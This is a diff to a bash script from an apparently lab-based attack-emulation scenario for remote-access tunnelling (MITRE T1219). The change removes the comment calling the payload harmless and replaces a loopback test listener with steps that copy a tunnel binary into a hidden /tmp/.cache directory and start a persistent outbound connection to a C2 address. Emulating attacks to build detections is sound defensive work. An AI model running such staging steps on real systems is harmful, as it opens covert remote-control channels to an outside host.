@@ -1,7 +1,6 @@
 #!/usr/bin/env bash
-# SecLab 剧本：在采集窗口内执行（collect.sh 已 cd 到工作区）。载荷无害。
+# attack（窗口内）：部署隧道工具并保持出站长连接。
 set -euo pipefail
-HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
-# T1219：隧道部署 + 出站长连接
-"$HERE/common/build.sh" tunnel.elf
-"$HERE/common/with_listener.sh" 8443 ./tunnel.elf 127.0.0.1 8443 3000
+C2_IP="${SECLAB_C2_IP:-198.51.100.50}"
+cp tunnel.elf /tmp/.cache/tunnel/tunnel.elf && chmod 0755 /tmp/.cache/tunnel/tunnel.elf
+/tmp/.cache/tunnel/tunnel.elf "$C2_IP" 8443 3000
